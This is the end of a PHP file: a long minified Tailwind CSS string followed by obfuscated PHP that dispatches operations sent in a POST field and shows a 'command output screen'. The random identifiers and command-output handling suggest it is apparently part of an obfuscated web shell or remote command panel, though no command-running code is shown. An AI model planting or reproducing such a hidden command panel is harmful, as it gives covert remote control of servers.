xmlns=\'http://www.w3.org/2000/svg\' fill=\'none\' viewBox=\'0 0 20 20\'%3E%3Cpath stroke=\'%236b7280\' stroke-linecap=\'round\' stroke-linejoin=\'round\' stroke-width=\'1.5\' d=\'m6 8 4 4 4-4\'/%3E%3C/svg%3E");background-position:right .5rem center;background-repeat:no-repeat;background-size:1.5em 1.5em;padding-right:2.5rem;-webkit-print-color-adjust:exact;print-color-adjust:exact}[multiple],[size]:where(select:not([size="1"])){background-image:none;background-position:0 0;background-repeat:unset;background-size:initial;padding-right:.75rem;-webkit-print-color-adjust:unset;print-color-adjust:unset}[type=checkbox],[type=radio]{-webkit-appearance:none;-moz-appearance:none;appearance:none;padding:0;-webkit-print-color-adjust:exact;print-color-adjust:exact;display:inline-block;vertical-align:middle;background-origin:border-box;-webkit-user-select:none;-moz-user-select:none;user-select:none;flex-shrink:0;height:1rem;width:1rem;color:#2563eb;background-color:#fff;border-color:#6b7280;border-width:1px;--tw-shadow:0 0 #0000}[type=checkbox]{border-radius:0}[type=radio]{border-radius:100%}[type=checkbox]:focus,[type=radio]:focus{outline:2px solid #0000;outline-offset:2px;--tw-ring-inset:var(--tw-empty,/*!*/ /*!*/);--tw-ring-offset-width:2px;--tw-ring-offset-color:#fff;--tw-ring-color:#2563eb;--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow)}[type=checkbox]:checked,[type=radio]:checked{border-color:#0000;background-color:currentColor;background-size:100% 100%;background-position:50%;background-repeat:no-repeat}[type=checkbox]:checked{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' fill=\'%23fff\' viewBox=\'0 0 16 16\'%3E%3Cpath d=\'M12.207 4.793a1 1 0 0 1 0 1.414l-5 5a1 1 0 0 1-1.414 0l-2-2a1 1 0 0 1 1.414-1.414L6.5 9.086l4.293-4.293a1 1 0 0 1 1.414 0z\'/%3E%3C/svg%3E")}@media (forced-colors:active) {[type=checkbox]:checked{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=radio]:checked{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' fill=\'%23fff\' viewBox=\'0 0 16 16\'%3E%3Ccircle cx=\'8\' cy=\'8\' r=\'3\'/%3E%3C/svg%3E")}@media (forced-colors:active) {[type=radio]:checked{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=checkbox]:checked:focus,[type=checkbox]:checked:hover,[type=checkbox]:indeterminate,[type=radio]:checked:focus,[type=radio]:checked:hover{border-color:#0000;background-color:currentColor}[type=checkbox]:indeterminate{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' fill=\'none\' viewBox=\'0 0 16 16\'%3E%3Cpath stroke=\'%23fff\' stroke-linecap=\'round\' stroke-linejoin=\'round\' stroke-width=\'2\' d=\'M4 8h8\'/%3E%3C/svg%3E");background-size:100% 100%;background-position:50%;background-repeat:no-repeat}@media (forced-colors:active) {[type=checkbox]:indeterminate{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=checkbox]:indeterminate:focus,[type=checkbox]:indeterminate:hover{border-color:#0000;background-color:currentColor}[type=file]{background:unset;border-color:inherit;border-width:0;border-radius:0;padding:0;font-size:unset;line-height:inherit}[type=file]:focus{outline:1px solid ButtonText;outline:1px auto -webkit-focus-ring-color}::-webkit-scrollbar{width:.5rem}::-webkit-scrollbar-track{border-radius:.5rem;--tw-bg-opacity:1;background-color:rgb(228 228 231/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-track{--tw-bg-opacity:1;background-color:rgb(39 39 42/var(--tw-bg-opacity))}}::-webkit-scrollbar-thumb{border-radius:.5rem;--tw-bg-opacity:1;background-color:rgb(161 161 170/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-thumb{--tw-bg-opacity:1;background-color:rgb(63 63 70/var(--tw-bg-opacity))}}::-webkit-scrollbar-thumb:hover{--tw-bg-opacity:1;background-color:rgb(113 113 122/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-thumb:hover{--tw-bg-opacity:1;background-color:rgb(82 82 91/var(--tw-bg-opacity))}}a{text-decoration:none!important}*,::backdrop,:after,:before{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:#3b82f680;--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }.container{width:100%}@media (min-width:640px){.container{max-width:640px}}@media (min-width:768px){.container{max-width:768px}}@media (min-width:1024px){.container{max-width:1024px}}@media (min-width:1280px){.container{max-width:1280px}}@media (min-width:1536px){.container{max-width:1536px}}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border-width:0}.visible{visibility:visible}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.inset-y-0{top:0;bottom:0}.z-50{z-index:50}.-mx-2{margin-left:-.5rem;margin-right:-.5rem}.-mx-4{margin-left:-1rem;margin-right:-1rem}.-my-2{margin-top:-.5rem;margin-bottom:-.5rem}.mx-1{margin-left:.25rem;margin-right:.25rem}.mx-auto{margin-left:auto;margin-right:auto}.mb-0{margin-bottom:0}.mb-8{margin-bottom:2rem}.ml-3{margin-left:.75rem}.ml-72{margin-left:18rem}.ml-auto{margin-left:auto}.mr-1{margin-right:.25rem}.mr-1\.5{margin-right:.375rem}.mt-1{margin-top:.25rem}.mt-10{margin-top:2.5rem}.mt-2{margin-top:.5rem}.mt-4{margin-top:1rem}.mt-8{margin-top:2rem}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.table{display:table}.flow-root{display:flow-root}.grid{display:grid}.contents{display:contents}.hidden{display:none}.h-16{height:4rem}.h-4{height:1rem}.h-5{height:1.25rem}.h-6{height:1.5rem}.h-8{height:2rem}.h-full{height:100%}.max-h-96{max-height:24rem}.min-h-full{min-height:100%}.w-1{width:.25rem}.w-1\/3{width:33.333333%}.w-4{width:1rem}.w-5{width:1.25rem}.w-6{width:1.5rem}.w-72{width:18rem}.w-8{width:2rem}.w-full{width:100%}.min-w-0{min-width:0}.min-w-full{min-width:100%}.max-w-full{max-width:100%}.max-w-xl{max-width:36rem}.flex-1{flex:1 1 0%}.flex-shrink-0,.shrink-0{flex-shrink:0}.flex-grow{flex-grow:1}.flex-grow-0{flex-grow:0}.cursor-pointer{cursor:pointer}.select-none{-webkit-user-select:none;-moz-user-select:none;user-select:none}.select-all{-webkit-user-select:all;-moz-user-select:all;user-select:all}.resize{resize:both}.list-inside{list-style-position:inside}.list-disc{list-style-type:disc}.grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}.flex-col{flex-direction:column}.items-start{align-items:flex-start}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-8{gap:2rem}.gap-x-3{-moz-column-gap:.75rem;column-gap:.75rem}.gap-x-4{-moz-column-gap:1rem;column-gap:1rem}.gap-y-2{row-gap:.5rem}.gap-y-5{row-gap:1.25rem}.gap-y-6{row-gap:1.5rem}.gap-y-7{row-gap:1.75rem}.space-y-6>:not([hidden])~:not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1.5rem*(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1.5rem*var(--tw-space-y-reverse))}.divide-y>:not([hidden])~:not([hidden]){--tw-divide-y-reverse:0;border-top-width:calc(1px*(1 - var(--tw-divide-y-reverse)));border-bottom-width:calc(1px*var(--tw-divide-y-reverse))}.divide-gray-200>:not([hidden])~:not([hidden]){--tw-divide-opacity:1;border-color:rgb(229 231 235/var(--tw-divide-opacity))}.divide-gray-300>:not([hidden])~:not([hidden]){--tw-divide-opacity:1;border-color:rgb(209 213 219/var(--tw-divide-opacity))}.overflow-auto{overflow:auto}.overflow-hidden{overflow:hidden}.overflow-x-auto{overflow-x:auto}.overflow-y-auto{overflow-y:auto}.overflow-y-scroll{overflow-y:scroll}.whitespace-nowrap{white-space:nowrap}.rounded{border-radius:.25rem}.rounded-lg{border-radius:.5rem}.rounded-md{border-radius:.375rem}.border-0{border-width:0}.border-b{border-bottom-width:1px}.border-l-4{border-left-width:4px}.border-yellow-500{--tw-border-opacity:1;border-color:rgb(234 179 8/var(--tw-border-opacity))}.border-zinc-300{--tw-border-opacity:1;border-color:rgb(212 212 216/var(--tw-border-opacity))}.border-zinc-700{--tw-border-opacity:1;border-color:rgb(63 63 70/var(--tw-border-opacity))}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251/var(--tw-bg-opacity))}.bg-indigo-500{--tw-bg-opacity:1;background-color:rgb(99 102 241/var(--tw-bg-opacity))}.bg-indigo-600{--tw-bg-opacity:1;background-color:rgb(79 70 229/var(--tw-bg-opacity))}.bg-red-500{--tw-bg-opacity:1;background-color:rgb(239 68 68/var(--tw-bg-opacity))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity))}.bg-white\/5{background-color:#ffffff0d}.bg-yellow-100{--tw-bg-opacity:1;background-color:rgb(254 249 195/var(--tw-bg-opacity))}.bg-zinc-100{--tw-bg-opacity:1;background-color:rgb(244 244 245/var(--tw-bg-opacity))}.bg-zinc-800{--tw-bg-opacity:1;background-color:rgb(39 39 42/var(--tw-bg-opacity))}.bg-zinc-900{--tw-bg-opacity:1;background-color:rgb(24 24 27/var(--tw-bg-opacity))}.bg-red-700{--tw-bg-opacity:1;background-color:rgb(185 28 28/var(--tw-bg-opacity))}.p-2{padding:.5rem}.p-3{padding:.75rem}.p-4{padding:1rem}.px-16{padding-left:4rem;padding-right:4rem}.px-2{padding-left:.5rem;padding-right:.5rem}.px-3{padding-left:.75rem;padding-right:.75rem}.px-4{padding-left:1rem;padding-right:1rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.py-1{padding-top:.25rem;padding-bottom:.25rem}.py-1\.5{padding-top:.375rem;padding-bottom:.375rem}.py-10{padding-top:2.5rem;padding-bottom:2.5rem}.py-12{padding-top:3rem;padding-bottom:3rem}.py-2{padding-top:.5rem;padding-bottom:.5rem}.py-3{padding-top:.75rem;padding-bottom:.75rem}.py-3\.5{padding-top:.875rem;padding-bottom:.875rem}.py-4{padding-top:1rem}.pb-4,.py-4{padding-bottom:1rem}.pl-3{padding-left:.75rem}.pr-10{padding-right:2.5rem}.pr-4{padding-right:1rem}.text-left{text-align:left}.text-center{text-align:center}.text-right{text-align:right}.align-middle{vertical-align:middle}.font-mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}.text-2xl{font-size:1.5rem;line-height:2rem}.text-base{font-size:1rem;line-height:1.5rem}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-sm{font-size:.875rem;line-height:1.25rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.font-semibold{font-weight:600}.leading-6{line-height:1.5rem}.leading-7{line-height:1.75rem}.leading-8{line-height:2rem}.leading-9{line-height:2.25rem}.tracking-tight{letter-spacing:-.025em}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128/var(--tw-text-opacity))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81/var(--tw-text-opacity))}.text-gray-900{--tw-text-opacity:1;color:rgb(17 24 39/var(--tw-text-opacity))}.text-indigo-600{--tw-text-opacity:1;color:rgb(79 70 229/var(--tw-text-opacity))}.text-red-500{--tw-text-opacity:1;color:rgb(239 68 68/var(--tw-text-opacity))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity))}.text-yellow-600{--tw-text-opacity:1;color:rgb(202 138 4/var(--tw-text-opacity))}.text-zinc-400{--tw-text-opacity:1;color:rgb(161 161 170/var(--tw-text-opacity))}.text-zinc-500{--tw-text-opacity:1;color:rgb(113 113 122/var(--tw-text-opacity))}.text-zinc-800{--tw-text-opacity:1;color:rgb(39 39 42/var(--tw-text-opacity))}.text-zinc-900{--tw-text-opacity:1;color:rgb(24 24 27/var(--tw-text-opacity))}.placeholder-zinc-400::-moz-placeholder{--tw-placeholder-opacity:1;color:rgb(161 161 170/var(--tw-placeholder-opacity))}.placeholder-zinc-400::placeholder{--tw-placeholder-opacity:1;color:rgb(161 161 170/var(--tw-placeholder-opacity))}.shadow{--tw-shadow:0 1px 3px 0 #0000001a,0 1px 2px -1px #0000001a;--tw-shadow-colored:0 1px 3px 0 var(--tw-shadow-color),0 1px 2px -1px var(--tw-shadow-color)}.shadow,.shadow-md{box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.shadow-md{--tw-shadow:0 4px 6px -1px #0000001a,0 2px 4px -2px #0000001a;--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color),0 2px 4px -2px var(--tw-shadow-color)}.shadow-sm{--tw-shadow:0 1px 2px 0 #0000000d;--tw-shadow-colored:0 1px 2px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.ring-1{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0 #0000)}.ring-inset{--tw-ring-inset:inset}.ring-black{--tw-ring-opacity:1;--tw-ring-color:rgb(0 0 0/var(--tw-ring-opacity))}.ring-gray-300{--tw-ring-opacity:1;--tw-ring-color:rgb(209 213 219/var(--tw-ring-opacity))}.ring-white\/10{--tw-ring-color:#ffffff1a}.ring-zinc-300{--tw-ring-opacity:1;--tw-ring-color:rgb(212 212 216/var(--tw-ring-opacity))}.ring-opacity-5{--tw-ring-opacity:0.05}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.duration-300{transition-duration:.3s}.hover\:bg-indigo-400:hover{--tw-bg-opacity:1;background-color:rgb(129 140 248/var(--tw-bg-opacity))}.hover\:bg-zinc-700:hover{--tw-bg-opacity:1;background-color:rgb(63 63 70/var(--tw-bg-opacity))}.hover\:text-zinc-700:hover{--tw-text-opacity:1;color:rgb(63 63 70/var(--tw-text-opacity))}.focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0 #0000)}.focus\:ring-inset:focus{--tw-ring-inset:inset}.focus\:ring-indigo-500:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(99 102 241/var(--tw-ring-opacity))}.focus\:ring-indigo-600:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(79 70 229/var(--tw-ring-opacity))}.focus-visible\:outline:focus-visible{outline-style:solid}.focus-visible\:outline-2:focus-visible{outline-width:2px}.focus-visible\:outline-offset-2:focus-visible{outline-offset:2px}.focus-visible\:outline-indigo-500:focus-visible{outline-color:#6366f1}@media (min-width:640px){.sm\:-mx-6{margin-left:-1.5rem;margin-right:-1.5rem}.sm\:mx-auto{margin-left:auto;margin-right:auto}.sm\:ml-16{margin-left:4rem}.sm\:mt-0{margin-top:0}.sm\:flex{display:flex}.sm\:w-full{width:100%}.sm\:max-w-sm{max-width:24rem}.sm\:flex-auto{flex:1 1 auto}.sm\:flex-none{flex:none}.sm\:flex-row{flex-direction:row}.sm\:flex-wrap{flex-wrap:wrap}.sm\:items-center{align-items:center}.sm\:space-x-6>:not([hidden])~:not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1.5rem*var(--tw-space-x-reverse));margin-left:calc(1.5rem*(1 - var(--tw-space-x-reverse)))}.sm\:truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.sm\:rounded-lg{border-radius:.5rem}.sm\:px-6{padding-left:1.5rem;padding-right:1.5rem}.sm\:text-3xl{font-size:1.875rem;line-height:2.25rem}.sm\:text-sm{font-size:.875rem;line-height:1.25rem}.sm\:leading-6{line-height:1.5rem}.sm\:tracking-tight{letter-spacing:-.025em}}@media (min-width:1024px){.lg\:-mx-8{margin-left:-2rem;margin-right:-2rem}.lg\:flex{display:flex}.lg\:items-center{align-items:center}.lg\:justify-between{justify-content:space-between}.lg\:px-8{padding-left:2rem;padding-right:2rem}}';

// Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
// on the page except the operation result.
$Ukq = array();
// Load the isolated operations
$qFg = array(&$Ukq);
yGUy("isolated_ops", $qFg);

/**
 * Define the enabled features
 *
 * @var array{title: string, description: string, svg: string, hidden?: bool, op: string}[] $Rwt
 */
$Rwt = array();
// Load the enabled features
$qFg = array(&$Rwt);
yGUy("features", $qFg);

// Check if the request is not POST and the operation is not in the isolated operations list, if that is the case,
// render the page
if (
    !yXXg() ||
    !yGSi($_POST["N62"], $Ukq)
) {
    // load the page or get the fallback page
    $HRc = yBjl($Rwt);
    yATb($Rwt, $HRc);

    // Check if the request is POST and the operation is not in the isolated operations list,
    // if that is the case open the command output screen to display the command output
    if (
        yXXg() &&
        !yGSi($_POST["N62"], $Ukq)
    ) {
        ylqR();
    }
}

// ensure the operation is a POST request, if so, call the operation handler
if (yXXg()) {
    $VPY = $_POST["N62"];
    $qFg = array($VPY, $Rwt);
    yStu("POST_operation", $VPY, $qFg);
}

// If the request is not POST and the operation is not in the isolated operations list, close the command output screen
if (
    !yXXg() &&
    !yGSi($_POST["N62"], $Ukq)
) {
    yPrI();
}

// section.main.end"